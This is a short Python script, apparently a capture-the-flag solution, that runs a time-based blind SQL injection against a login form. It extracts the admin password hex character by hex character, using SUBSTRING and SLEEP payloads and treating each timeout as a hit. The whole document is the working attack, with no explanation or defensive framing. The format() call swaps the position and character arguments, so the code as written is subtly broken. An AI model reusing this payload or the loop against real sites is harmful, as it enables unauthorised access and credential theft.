import requests
from requests.exceptions import ReadTimeout

sess = requests.session()

def login(n, ch):
    url = 'https://uw2017.p4.team/blindoracle'

    data = {
        'username': "admin' and substring((SELECT password FROM users WHERE username='admin'), {}, 1) = '{}' and sleep(5)#".format(ch, n),
        'password': 'fdsfasd'
    }

    # print(data)

    try:
        resp = sess.post(url, data=data, timeout=2)
    except ReadTimeout:
        return True

    return False


result = ''

for i in range(1, 33):
    for c in '0123456789' + 'abcdefABCDEF':
        if login(i, c):
            result += c
            print(result)
            break

